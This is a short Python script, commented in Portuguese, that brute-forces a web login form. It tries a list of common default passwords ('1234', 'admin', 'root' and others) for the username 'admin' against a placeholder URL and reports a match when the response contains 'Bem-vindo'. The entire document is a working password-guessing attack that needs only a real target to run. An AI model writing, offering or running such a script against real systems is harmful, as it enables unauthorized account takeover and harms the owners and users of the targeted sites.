import requests

# URL do formulário de login alvo
url = "http://example.com/login"

# Nome de usuário fixo que será testado
username = "admin"

# Lista de senhas que serão testadas
passwords = ["1234", "admin", "password", "root", "admin123"]

# Loop para testar cada senha
for pwd in passwords:
    # Envia uma requisição POST com os dados de login
    response = requests.post(url, data={"username": username, "password": pwd})

    # Verifica se a resposta indica sucesso no login
    if "Bem-vindo" in response.text:
        print(f"[+] Senha encontrada: {pwd}")
        break
    else:
        print(f"[-] Tentativa com '{pwd}' falhou.")